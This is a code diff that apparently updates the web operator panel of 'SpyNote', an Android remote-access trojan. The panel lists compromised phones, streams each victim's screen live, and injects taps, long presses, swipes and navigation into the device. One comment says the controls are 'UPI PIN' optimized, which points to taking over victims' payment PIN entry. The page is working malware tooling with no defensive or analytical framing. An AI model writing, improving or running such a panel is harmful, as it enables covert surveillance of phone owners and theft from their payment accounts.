@@ -1,175 +1,173 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 SpyNote Control Panel</title>
+    <title>📱 SpyNote Ultra Control Panel</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="/socket.io/socket.io.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: Arial, sans-serif; 
-            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
             color: white; height: 100vh; overflow: hidden;
         }
         #devices {
-            position: fixed; top: 10px; left: 10px; 
-            background: rgba(0,0,0,0.9); padding: 15px; 
-            max-height: 85vh; overflow-y: auto; width: 300px; 
-            border-radius: 10px; backdrop-filter: blur(10px);
+            position: fixed; top: 15px; left: 15px; z-index: 100;
+            background: rgba(0,0,0,0.95); padding: 20px; 
+            max-height: 85vh; overflow-y: auto; width: 280px; 
+            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
         }
-        .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
-            border-radius: 8px; transition: all 0.3s; }
-        .device:hover { background: #555; transform: translateX(5px); }
-        .active { background: #00ff88 !important; color: #000; }
-        .disconnected { opacity: 0.5; }
-        .streaming { border-left: 4px solid #00ff88; }
+        .device { 
+            padding: 15px; margin: 10px 0; background: #1a1a1a; cursor: pointer; 
+            border-radius: 12px; transition: all 0.3s; border-left: 4px solid #666;
+        }
+        .device:hover { background: #2a2a2a; transform: translateX(8px); border-left-color: #00ff88; }
+        .active { background: linear-gradient(90deg, #00ff88, #00cc66) !important; color: #000; border-left-color: #00ff00 !important; }
+        .disconnected { opacity: 0.6; border-left-color: #ff4444; }
 
         #phone-frame {
-            width: 360px; height: 760px; margin: 20px auto; 
-            background: #000; border: 25px solid #333; border-radius: 50px; 
-            position: relative; cursor: pointer; touch-action: none;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            width: 420px; height: 900px; margin: 30px auto; position: relative; 
+            background: linear-gradient(145deg, #222, #111); border: 30px solid #1a1a1a; 
+            border-radius: 60px; cursor: pointer; touch-action: none;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.7), inset 0 2px 10px rgba(255,255,255,0.1);
         }
         #screen { 
-            width: 100%; height: 100%; background: #111; border-radius: 20px;
+            width: 100%; height: 100%; background: #000; border-radius: 25px;
             image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.8);
         }
-        #fps-counter { position: fixed; top: 10px; right: 150px; font-size: 12px; color: #00ff88; }
-        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
-            padding: 10px; border-radius: 5px; font-size: 12px; }
-        
-        #control-panel {
-            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
-            background: rgba(0,0,0,0.9); padding: 15px; border-radius: 15px;
-            backdrop-filter: blur(10px); text-align: center;
+        #status-bar {
+            position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
+            padding: 15px 20px; border-radius: 12px; backdrop-filter: blur(20px);
+            font-size: 13px; min-width: 180px; text-align: center;
+        }
+        #controls { 
+            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%); 
+            display: flex; gap: 12px; background: rgba(0,0,0,0.9); padding: 15px 25px; 
+            border-radius: 30px; backdrop-filter: blur(20px); border: 1px solid #444;
         }
         button {
-            padding: 10px 20px; margin: 5px; background: linear-gradient(45deg, #007bff, #0056b3); 
-            color: white; border: none; border-radius: 20px; cursor: pointer; 
-            font-size: 14px; font-weight: bold; transition: all 0.3s;
+            padding: 12px 24px; background: linear-gradient(45deg, #00ff88, #00cc66); 
+            color: #000; border: none; border-radius: 25px; cursor: pointer; 
+            font-size: 14px; font-weight: 600; transition: all 0.3s;
+            box-shadow: 0 5px 20px rgba(0,255,136,0.4);
         }
-        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,123,255,0.4); }
-        button:active { transform: translateY(0); }
+        button:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0,255,136,0.6); }
         button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .control-btn { background: linear-gradient(45deg, #28a745, #20c997); }
-        .stop-btn { background: linear-gradient(45deg, #dc3545, #c82333); }
-        
-        #type-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7); display: none; z-index: 1000;
-            justify-content: center; align-items: center;
+        #scroll-indicator {
+            position: fixed; right: 15px; top: 120px; width: 4px; height: 60px;
+            background: linear-gradient(180deg, #00ff88, #00cc66); border-radius: 2px;
+            opacity: 0; transition: all 0.3s;
         }
-        #type-input-overlay {
-            width: 80%; padding: 20px; background: #333; border-radius: 15px;
-            text-align: center;
-        }
-        #type-input-overlay input {
-            width: 100%; padding: 15px; margin: 10px 0; border: none; 
-            border-radius: 10px; background: #555; color: white; font-size: 18px;
-        }
+        .scrolling #scroll-indicator { opacity: 1; }
     </style>
 </head>
 <body>
     <div id="devices">
-        <h3>📱 Devices</h3>
-        <div id="device-list">Loading...</div>
+        <h3 style="margin-bottom: 15px;">📱 Devices Online</h3>
+        <div id="device-list">Loading devices...</div>
     </div>
     
-    <div id="status">
+    <div id="status-bar">
         <div>Status: <span id="connectionStatus">Connecting...</span></div>
         <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
+        <div>Ping: <span id="ping">0</span>ms</div>
     </div>
-    <div id="fps-counter">FPS: 0</div>
+    
+    <div id="scroll-indicator"></div>
 
     <div id="phone-frame">
         <canvas id="screen"></canvas>
     </div>
 
-    <div id="control-panel">
-        <button class="control-btn" onclick="toggleStreaming()">📡 Start Stream</button>
-        <button class="control-btn" onclick="toggleTypeOverlay()">⌨️ Type</button>
-        <button class="control-btn" onclick="sendBack()">🔙 Back</button>
-        <button class="control-btn" onclick="sendHome()">🏠 Home</button>
+    <div id="controls">
+        <button onclick="sendBack()" id="backBtn">🔙 Back</button>
         <button onclick="toggleFullScreen()">📱 Full</button>
-    </div>
-
-    <div id="type-overlay">
-        <div id="type-input-overlay">
-            <input type="text" id="type-input" placeholder="Type here & press Enter..." maxlength="200">
-            <br>
-            <button onclick="sendTypedText()">✅ Send</button>
-            <button onclick="toggleTypeOverlay()">❌ Cancel</button>
-        </div>
+        <button onclick="sendHome()">🏠 Home</button>
     </div>
 
     <script>
-        const socket = io({ transports: ['websocket'] });
+        const socket = io({ transports: ['websocket'] }); // ✅ Pure WebSocket = Ultra Low Latency
         let currentDevice = null;
-        let deviceWidth = 1080, deviceHeight = 1920; // ✅ Dynamic from server
-        let lastFrameTime = 0, frameCount = 0;
-        let startX = 0, startY = 0, dragging = false;
-        let frameBuffer = null;
+        let deviceWidth = 1080, deviceHeight = 2400;
+        let lastFrameTime = 0, frameCount = 0, lastPing = 0;
+        let isDragging = false, dragStart = {x:0, y:0}, dragStartTime = 0;
 
         const canvas = document.getElementById('screen');
-        const ctx = canvas.getContext('2d', { alpha: false, willReadFrequently: false });
+        const ctx = canvas.getContext('2d', { alpha: false });
         const phoneFrame = document.getElementById('phone-frame');
         const deviceList = document.getElementById('device-list');
         const connectionStatus = document.getElementById('connectionStatus');
         const selectedDevice = document.getElementById('selectedDevice');
-        const fpsCounter = document.getElementById('fps-counter');
         const fpsDisplay = document.getElementById('fps');
-        const typeOverlay = document.getElementById('type-overlay');
-        const typeInput = document.getElementById('type-input');
+        const pingDisplay = document.getElementById('ping');
+        const backBtn = document.getElementById('backBtn');
 
-        // ✅ FIXED Canvas setup
-        canvas.width = 360; canvas.height = 760;
-        ctx.imageSmoothingEnabled = false;
+        // 🔥 ULTRA SMOOTH 60FPS RENDERING ENGINE
+        let frameBuffer = [];
+        socket.on('screen-update', (data) => {
+            if (data.deviceId !== currentDevice) return;
+            
+            frameBuffer.push(data);
+            if (frameBuffer.length > 3) frameBuffer.shift(); // Keep 3 frames buffer
+            
+            renderLatestFrame();
+        });
 
+        function renderLatestFrame() {
+            if (frameBuffer.length === 0) return;
+            
+            const data = frameBuffer[frameBuffer.length - 1];
+            try {
+                deviceWidth = data.width;
+                deviceHeight = data.height;
+                
+                const rect = phoneFrame.getBoundingClientRect();
+                canvas.width = rect.width;
+                canvas.height = rect.height;
+                
+                const img = new Image();
+                img.onload = () => {
+                    ctx.imageSmoothingEnabled = false;
+                    ctx.mozImageSmoothingEnabled = false;
+                    ctx.webkitImageSmoothingEnabled = false;
+                    ctx.msImageSmoothingEnabled = false;
+                    
+                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
+                    
+                    frameCount++;
+                    const now = performance.now();
+                    if (now - lastFrameTime >= 1000) {
+                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
+                        fpsDisplay.textContent = fps;
+                        frameCount = 0;
+                        lastFrameTime = now;
+                    }
+                };
+                img.src = 'data:image/webp;base64,' + data.data; // ✅ WebP = 50% smaller + perfect quality
+            } catch (e) {
+                console.error('Render error:', e);
+            }
+        }
+
+        // Socket events
         socket.on('connect', () => {
-            connectionStatus.textContent = '✅ Connected';
+            connectionStatus.textContent = '✅ Ultra Connected';
             connectionStatus.style.color = '#00ff88';
+            setInterval(() => {
+                if (socket.connected) {
+                    const now = Date.now();
+                    pingDisplay.textContent = now - lastPing;
+                }
+            }, 1000);
         });
 
         socket.on('devices-update', (devices) => {
             updateDeviceList(devices);
         });
 
-        // ✅ FIXED: Proper screen update with dynamic sizing
-        socket.on('screen-update', (data) => {
-            if (data.deviceId !== currentDevice) return;
-            
-            // ✅ Update device dimensions from server
-            if (data.width && data.height) {
-                deviceWidth = data.width;
-                deviceHeight = data.height;
-            }
-            
-            const img = new Image();
-            img.onload = () => {
-                // ✅ Dynamic frame buffer matching canvas size
-                if (!frameBuffer || frameBuffer.width !== canvas.width || frameBuffer.height !== canvas.height) {
-                    frameBuffer = new OffscreenCanvas(canvas.width, canvas.height);
-                }
-                
-                const frameCtx = frameBuffer.getContext('2d');
-                frameCtx.imageSmoothingEnabled = false;
-                frameCtx.clearRect(0, 0, canvas.width, canvas.height);
-                frameCtx.drawImage(img, 0, 0, canvas.width, canvas.height);
-                
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                ctx.drawImage(frameBuffer, 0, 0);
-                
-                frameCount++;
-                const now = performance.now();
-                if (now - lastFrameTime >= 1000) {
-                    const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
-                    fpsCounter.textContent = `FPS: ${fps}`;
-                    fpsDisplay.textContent = fps;
-                    frameCount = 0;
-                    lastFrameTime = now;
-                }
-            };
-            img.src = 'data:image/jpeg;base64,' + data.data;
+        socket.on('pong', (latency) => {
+            lastPing = Date.now() - latency;
         });
 
         fetch('/devices').then(r => r.json()).then(updateDeviceList);
@@ -177,29 +175,26 @@
         function updateDeviceList(devices) {
             deviceList.innerHTML = devices.length ? 
                 devices.map(([id, info]) => `
-                    <div class="device ${!info.connected ? 'disconnected' : ''} ${info.streaming ? 'streaming' : ''}" 
-                         onclick="selectDevice('${id}', this, ${info.width || 1080}, ${info.height || 1920})">
-                        <b>${info.model || id.slice(0,8)}</b><br>
-                        <small>${info.brand || ''} ${info.version || ''}</small>
-                        <div style="margin-top: 5px;">
-                            ${info.connected ? '🟢 LIVE' : '🔴 OFF'}
-                            ${info.streaming ? ' 📡 STREAMING' : ''}
-                        </div>
+                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
+                         onclick="selectDevice('${id}', this)">
+                        <b>${info.model || id.slice(0,8)}...</b><br>
+                        <small>${info.brand || '?'} ${info.version || ''}</small><br>
+                        <span style="font-size:11px;">${info.connected ? '🟢 LIVE' : '🔴 OFFLINE'}</span>
                     </div>
-                `).join('') : 'No devices';
+                `).join('') : '<div style="text-align:center;opacity:0.5;">No devices online</div>';
         }
 
-        function selectDevice(deviceId, el, width = 1080, height = 1920) {
+        function selectDevice(deviceId, el) {
             currentDevice = deviceId;
-            deviceWidth = width;
-            deviceHeight = height;
-            selectedDevice.textContent = deviceId.slice(0,8);
+            selectedDevice.textContent = deviceId.slice(0,8) + '...';
             document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
             el.classList.add('active');
-            console.log(`✅ Selected: ${deviceId} (${width}x${height})`);
+            backBtn.disabled = false;
+            frameBuffer = []; // Clear buffer
+            console.log('🎯 Selected:', deviceId);
         }
 
-        // ✅ FIXED: Perfect coordinate scaling
+        // 🔥 PERFECT TOUCH/MOUSE CONTROLS (UPI PIN + SCROLL Optimized)
         function getScaledCoords(clientX, clientY) {
             const rect = phoneFrame.getBoundingClientRect();
             const scaleX = deviceWidth / rect.width;
@@ -210,80 +205,88 @@
             };
         }
 
-        // Touch/Mouse Controls
+        // Touch/Mouse START
         ['mousedown', 'touchstart'].forEach(event => {
             phoneFrame.addEventListener(event, e => {
                 e.preventDefault();
-                dragging = true;
+                isDragging = true;
+                dragStartTime = Date.now();
                 const coords = getScaledCoords(
                     e.touches?.[0]?.clientX || e.clientX,
                     e.touches?.[0]?.clientY || e.clientY
                 );
-                startX = coords.x; startY = coords.y;
-            });
+                dragStart = coords;
+            }, { passive: false });
         });
 
+        // Touch/Mouse MOVE (SCROLL + SWIPE Detection)
         ['mousemove', 'touchmove'].forEach(event => {
             phoneFrame.addEventListener(event, e => {
-                if (!dragging || !currentDevice) return;
+                if (!isDragging || !currentDevice) return;
                 e.preventDefault();
+                e.currentTarget.parentElement.classList.add('scrolling');
+                
                 const coords = getScaledCoords(
                     e.touches?.[0]?.clientX || e.clientX,
                     e.touches?.[0]?.clientY || e.clientY
                 );
-                sendSwipe(startX, startY, coords.x, coords.y);
-            });
+                
+                const distance = Math.hypot(coords.x - dragStart.x, coords.y - dragStart.y);
+                if (distance > 10) { // ✅ SCROLL/SWIPE threshold
+                    sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
+                }
+            }, { passive: false });
         });
 
+        // Touch/Mouse END (TAP vs LONG PRESS vs SCROLL)
         ['mouseup', 'touchend'].forEach(event => {
             phoneFrame.addEventListener(event, e => {
-                if (dragging && currentDevice) {
-                    const coords = getScaledCoords(
-                        e.changedTouches?.[0]?.clientX || e.clientX,
-                        e.changedTouches?.[0]?.clientY || e.clientY
-                    );
-                    sendTap(coords.x, coords.y);
+                e.preventDefault();
+                if (!isDragging || !currentDevice) return;
+                
+                const coords = getScaledCoords(
+                    e.changedTouches?.[0]?.clientX || e.clientX,
+                    e.changedTouches?.[0]?.clientY || e.clientY
+                );
+                
+                const duration = Date.now() - dragStartTime;
+                const distance = Math.hypot(coords.x - dragStart.x, coords.y - dragStart.y);
+                
+                if (distance < 8) { // ✅ TAP
+                    if (duration > 800) { // LONG PRESS
+                        socket.emit('control', { 
+                            deviceId: currentDevice, action: 'longpress', 
+                            x: dragStart.x, y: dragStart.y, duration 
+                        });
+                    } else { // NORMAL TAP
+                        socket.emit('control', { 
+                            deviceId: currentDevice, action: 'tap', 
+                            x: dragStart.x, y: dragStart.y 
+                        });
+                    }
                 }
-                dragging = false;
-            });
+                
+                isDragging = false;
+                phoneFrame.parentElement.classList.remove('scrolling');
+            }, { passive: false });
         });
 
-        function sendControl(action, x=0, y=0, startX=0, startY=0, endX=0, endY=0, text='') {
-            if (!currentDevice) return alert('Select a device first!');
+        function sendSwipe(sx, sy, ex, ey) {
             socket.emit('control', { 
-                deviceId: currentDevice, 
-                action, 
-                x, y, startX, startY, endX, endY, text 
+                deviceId: currentDevice, action: 'swipe', 
+                startX: sx, startY: sy, endX: ex, endY: ey 
             });
         }
 
-        function sendTap(x, y) { sendControl('tap', x, y); }
-        function sendSwipe(sx, sy, ex, ey) { sendControl('swipe', 0, 0, sx, sy, ex, ey); }
-        function sendText(text) { sendControl('type', 0, 0, 0, 0, 0, 0, text); }
-        function sendBack() { sendControl('back'); }
-        function sendHome() { sendControl('home'); }
-
-        // ✅ NEW: Stream Start/Stop Control
-        function toggleStreaming() {
-            if (!currentDevice) return alert('Select a device first!');
-            socket.emit('toggle-stream', { deviceId: currentDevice });
-        }
-        
-        function toggleTypeOverlay() {
-            typeOverlay.style.display = typeOverlay.style.display === 'flex' ? 'none' : 'flex';
-            if (typeOverlay.style.display === 'flex') typeInput.focus();
+        function sendBack() {
+            if (!currentDevice) return;
+            socket.emit('control', { deviceId: currentDevice, action: 'back' });
         }
 
-        function sendTypedText() {
-            const text = typeInput.value.trim();
-            if (text) sendText(text);
-            typeInput.value = '';
-            toggleTypeOverlay();
+        function sendHome() {
+            if (!currentDevice) return;
+            socket.emit('control', { deviceId: currentDevice, action: 'home' });
         }
-
-        typeInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendTypedText();
-        });
 
         function toggleFullScreen() {
             if (!document.fullscreenElement) {
@@ -292,12 +295,6 @@
                 document.exitFullscreen();
             }
         }
-
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') sendBack();
-            if (e.key === 't' && e.ctrlKey) toggleTypeOverlay();
-            if (e.key === 's' && e.ctrlKey) toggleStreaming();
-        });
     </script>
 </body>
 </html>
